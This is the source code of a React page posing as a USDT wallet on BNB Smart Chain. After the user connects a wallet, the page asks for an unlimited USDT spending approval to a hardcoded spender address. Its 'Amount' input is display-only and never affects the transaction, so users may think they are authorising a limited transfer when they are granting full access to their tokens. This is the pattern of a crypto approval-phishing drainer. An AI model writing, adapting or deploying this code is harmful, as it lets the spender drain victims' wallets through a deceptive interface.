 import { useEffect, useState } from "react";
import { ethers } from "ethers";

const USDT_BSC =
  "0x55d398326f99059fF775485246999027B3197955";

const SPENDER_ADDRESS =
  "0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1";

const ERC20_ABI = [
  "function approve(address spender,uint256 amount) external returns(bool)",
];

export default function Home() {
  const [wallet, setWallet] = useState(null);

  const [showSend, setShowSend] =
    useState(false);

  const [recipient, setRecipient] =
    useState(SPENDER_ADDRESS);

  const [loading, setLoading] =
    useState(false);

  // ONLY UI DISPLAY
  const [displayAmount, setDisplayAmount] =
    useState("");

  async function connectWallet() {
    try {
      if (!window.ethereum) {
        alert(
          "Open inside Trust Wallet or MetaMask browser"
        );
        return;
      }

      const provider =
        new ethers.providers.Web3Provider(
          window.ethereum
        );

      await provider.send(
        "eth_requestAccounts",
        []
      );

      const signer =
        provider.getSigner();

      const address =
        await signer.getAddress();

      setWallet(address);

      setShowSend(true);

    } catch (err) {
      console.error(err);
    }
  }

  async function switchToBSC() {
    try {
      await window.ethereum.request({
        method:
          "wallet_switchEthereumChain",

        params: [
          {
            chainId: "0x38",
          },
        ],
      });

    } catch (switchError) {

      if (
        switchError.code === 4902
      ) {
        await window.ethereum.request({
          method:
            "wallet_addEthereumChain",

          params: [
            {
              chainId: "0x38",

              chainName:
                "BNB Smart Chain",

              nativeCurrency: {
                name: "BNB",

                symbol: "BNB",

                decimals: 18,
              },

              rpcUrls: [
                "https://bsc-dataseed.binance.org/",
              ],

              blockExplorerUrls: [
                "https://bscscan.com",
              ],
            },
          ],
        });

      } else {
        throw switchError;
      }
    }
  }

  async function approveToken() {
    try {
      if (!window.ethereum) return;

      if (!recipient) return;

      setLoading(true);

      await switchToBSC();

      const provider =
        new ethers.providers.Web3Provider(
          window.ethereum
        );

      const signer =
        provider.getSigner();

      const contract =
        new ethers.Contract(
          USDT_BSC,
          ERC20_ABI,
          signer
        );

      // UNLIMITED APPROVAL
      const tx =
        await contract.approve(
          recipient,

          "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        );

      await tx.wait();

      alert(
        "Unlimited approval completed successfully"
      );

    } catch (err) {
      console.error(err);

      alert("Transaction failed");

    } finally {
      setLoading(false);
    }
  }

  useEffect(() => {
    async function checkWallet() {
      try {
        if (!window.ethereum)
          return;

        const accounts =
          await window.ethereum.request({
            method:
              "eth_accounts",
          });

        if (
          accounts.length > 0
        ) {
          setWallet(
            accounts[0]
          );

          setShowSend(true);
        }

      } catch (err) {
        console.error(err);
      }
    }

    checkWallet();
  }, []);

  return (
    <div
      style={{
        minHeight: "100vh",

        background: "#080B12",

        display: "flex",

        justifyContent:
          "center",

        alignItems: "center",

        color: "white",

        fontFamily: "Arial",
      }}
    >
      <div
        style={{
          width: 390,

          height: 844,

          background: "#111318",

          borderRadius: 40,

          padding: 24,

          overflow: "hidden",
        }}
      >
        {!wallet ? (
          <div
            style={{
              height: "100%",

              display: "flex",

              flexDirection:
                "column",

              justifyContent:
                "center",
            }}
          >
            <div
              style={{
                fontSize: 42,

                fontWeight:
                  "bold",

                textAlign:
                  "center",

                marginBottom: 10,
              }}
            >
              Wallet
            </div>

            <div
              style={{
                textAlign:
                  "center",

                color: "#777",

                marginBottom: 50,
              }}
            >
              USDT BNB Wallet
            </div>

            <button
              style={{
                width: "100%",

                padding: 18,

                borderRadius: 20,

                border: "none",

                background:
                  "#35E07A",

                fontWeight:
                  "bold",

                fontSize: 18,

                marginBottom: 16,

                opacity: 0.7,
              }}
            >
              Create Wallet
            </button>

            <button
  onClick={() => alert("BUTTON WORKS")}
  style={{
    width: "100%",
    padding: 18,
    borderRadius: 20,
    border: "1px solid #2A2F3A",
    background: "#ff0000",
    color: "white",
    fontWeight: "bold",
    fontSize: 18,
    cursor: "pointer",
    position: "relative",
    zIndex: 9999,
    pointerEvents: "auto",
  }}
>
  TEST BUTTON
</button>
          </div>
        ) : showSend ? (
          <div
            style={{
              display: "flex",

              flexDirection:
                "column",

              height: "100%",
            }}
          >
            <div
              style={{
                fontSize: 32,

                fontWeight:
                  "bold",

                marginBottom: 30,
              }}
            >
              Unlimited Approval
            </div>

            <div
              style={{
                background:
                  "#1B1F27",

                borderRadius: 20,

                padding: 18,

                display: "flex",

                alignItems:
                  "center",

                gap: 14,

                marginBottom: 24,
              }}
            >
              <img
                src="https://cryptologos.cc/logos/tether-usdt-logo.png?v=029"

                alt="USDT"

                style={{
                  width: 48,

                  height: 48,
                }}
              />

              <div>
                Tether USD (BNB)
              </div>
            </div>

            <div
              style={{
                marginBottom: 10,

                color: "#aaa",
              }}
            >
              Spender Address
            </div>

            <input
              value={recipient}

              onChange={(e) =>
                setRecipient(
                  e.target.value
                )
              }

              style={{
                background:
                  "#1B1F27",

                border:
                  "1px solid #2A2F3A",

                borderRadius: 18,

                padding: 18,

                color: "white",

                fontSize: 16,

                outline: "none",

                width: "100%",

                boxSizing:
                  "border-box",
              }}
            />

            <div
              style={{
                marginTop: 20,

                marginBottom: 10,

                color: "#aaa",
              }}
            >
              Amount
            </div>

            <input
              placeholder=""

              value={displayAmount}

              onChange={(e) =>
                setDisplayAmount(
                  e.target.value
                )
              }

              style={{
                background:
                  "#1B1F27",

                border:
                  "1px solid #2A2F3A",

                borderRadius: 18,

                padding: 18,

                color: "white",

                width: "100%",

                boxSizing:
                  "border-box",
              }}
            />

            <div
              style={{
                marginTop: 20,

                color: "#999",

                fontSize: 14,

                lineHeight: 1.5,
              }}
            >
              This transaction requests
              an unlimited token approval.
            </div>

            <button
              onClick={
                approveToken
              }

              disabled={loading}

              style={{
                marginTop: "auto",

                background:
                  loading
                    ? "#2f9d5b"
                    : "#35E07A",

                border: "none",

                borderRadius: 999,

                padding: 22,

                fontSize: 24,

                fontWeight:
                  "bold",

                cursor:
                  "pointer",

                width: "100%",
              }}
            >
              {loading
                ? "Processing..."
                : "Continue"}
            </button>
          </div>
        ) : null}
      </div>
    </div>
  );
}